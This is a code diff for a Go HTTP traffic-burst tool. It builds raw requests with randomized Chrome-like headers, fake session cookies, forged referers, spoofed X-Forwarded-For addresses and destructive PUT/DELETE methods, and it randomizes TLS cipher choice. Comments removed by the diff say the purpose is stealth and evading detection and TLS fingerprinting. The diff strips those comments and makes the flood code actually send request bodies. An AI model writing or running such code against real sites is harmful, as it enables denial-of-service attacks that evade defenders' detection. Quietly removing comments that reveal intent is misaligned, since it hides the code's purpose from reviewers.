 		line := "X-Mystery-Header: " + randomString(rng, 10) + "\r\n"
@@ -1613,13 +1481,11 @@ func (m *Manager) sendBurst(conn net.Conn, rng *rand.Rand, hostHdr, method, path
 		return false, 0
 	}
 
-	// Drain response with a short timeout to keep the pipeline moving.
 	conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
 	var tmp [4096]byte
 	for {
 		n, err := conn.Read(tmp[:])
 		if n > 0 {
-			// consumed response data
 		}
 		if err != nil {
 			break
@@ -1631,9 +1497,6 @@ func (m *Manager) sendBurst(conn net.Conn, rng *rand.Rand, hostHdr, method, path
 	return true, latency
 }
 
-// buildRequest writes a raw HTTP/1.1 request with recon-informed randomization.
-// Uses recon-discovered endpoints and methods while maintaining randomness
-// to avoid detection patterns.
 func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, hostHdr, path string, body []byte) {
 	hostPort := hostHdr
 	if cfg.Port != 80 && cfg.Port != 443 {
@@ -1643,11 +1506,9 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, h
 	ua := randomUserAgent(rng)
 	chrome := isChromeUA(ua)
 
-	// Chrome-realistic header order with randomization.
 	fmt.Fprintf(buf, "%s %s HTTP/1.1\r\n", method, path)
 	buf.WriteString("Host: " + hostPort + "\r\n")
 
-	// Client hints (Chrome only, sent before User-Agent).
 	if chrome {
 		cv := randomChromeVersion(rng)
 		fmt.Fprintf(buf, "sec-ch-ua: \"Google Chrome\";v=\"%s\", \"Chromium\";v=\"%s\", \";Not A Brand\";v=\"99\"\r\n", cv, cv)
@@ -1663,25 +1524,19 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, h
 	buf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
 	buf.WriteString("DNT: 1\r\n")
 
-	// Fetch navigation headers.
 	buf.WriteString("Sec-Fetch-Site: none\r\n")
 	buf.WriteString("Sec-Fetch-Mode: navigate\r\n")
 	buf.WriteString("Sec-Fetch-User: ?1\r\n")
 	buf.WriteString("Sec-Fetch-Dest: document\r\n")
 
-	// Stealth: random session cookie.
 	buf.WriteString("Cookie: sessionid=" + randomString(rng, 32) + "\r\n")
-
-	// Stealth: referer chain to look like internal navigation.
 	buf.WriteString("Referer: https://" + hostHdr + "/\r\n")
 	buf.WriteString("Origin: https://" + hostHdr + "\r\n")
 	buf.WriteString("Cache-Control: max-age=0\r\n")
 
-	// X-Forwarded-For spoofing.
 	fmt.Fprintf(buf, "X-Forwarded-For: %d.%d.%d.%d\r\n",
 		rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
 
-	// Destructive method indicators (appear as server-managed headers).
 	if method == "PUT" || method == "DELETE" || method == "PATCH" {
 		buf.WriteString("If-Match: \"some-etag-value\"\r\n")
 		buf.WriteString("Content-Location: /target-resource\r\n")
@@ -1693,14 +1548,15 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, h
 		buf.WriteString("Destination: /deleted-resource\r\n")
 	}
 
-	// Use provided body or generate one based on method.
 	if body != nil && len(body) > 0 {
 		ct := contentTypes[rng.Intn(len(contentTypes))]
 		fmt.Fprintf(buf, "Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body))
+		buf.Write(body)
 	} else if method == "POST" || method == "PUT" || method == "PATCH" {
 		ct := contentTypes[rng.Intn(len(contentTypes))]
 		genBody := createBody(rng, ct)
 		fmt.Fprintf(buf, "Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(genBody))
+		buf.Write(genBody)
 	} else {
 		buf.WriteString("Content-Length: 0\r\n")
 	}
@@ -1754,14 +1610,16 @@ func lookupIPv4(host string) ([]string, error) {
 
 // ─── Dialling ─────────────────────────────────────────────────────────────────
 
+var sharedDialer = &net.Dialer{
+	Timeout:   3 * time.Second,
+	KeepAlive: 30 * time.Second,
+}
+
+var dialRNG = rand.New(rand.NewSource(time.Now().UnixNano()))
+
 func dialConn(ctx context.Context, addr string, isTLS bool, serverName string) (net.Conn, error) {
-	netDialer := &net.Dialer{
-		Timeout:   3 * time.Second,
-		KeepAlive: 30 * time.Second,
-	}
 	if isTLS {
-		// Randomize TLS fingerprint to evade TLS fingerprinting-based detection.
-		cipherSuite := tlsCipherSuites[0] // Use a common cipher suite
+		cipherSuite := tlsCipherSuites[dialRNG.Intn(len(tlsCipherSuites))]
 		tlsCfg := &tls.Config{
 			ServerName:         serverName,
 			InsecureSkipVerify: true,
@@ -1770,12 +1628,11 @@ func dialConn(ctx context.Context, addr string, isTLS bool, serverName string) (
 			MaxVersion:         tls.VersionTLS13,
 			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
 		}
-		return (&tls.Dialer{NetDialer: netDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
+		return (&tls.Dialer{NetDialer: sharedDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
 	}
-	return netDialer.DialContext(ctx, "tcp", addr)
+	return sharedDialer.DialContext(ctx, "tcp", addr)
 }
 
-// Cipher suites to cycle through for TLS fingerprint randomization.
 var tlsCipherSuites = []uint16{
 	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
 	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
@@ -1893,7 +1750,7 @@ func createBody(rng *rand.Rand, ct string) []byte {
 		}
 		b.WriteByte('}')
 
-	default: // text/plain
+	default:
 		b.WriteString("text_" + randomString(rng, 10+rng.Intn(20)))
 	}
 	return b.Bytes()
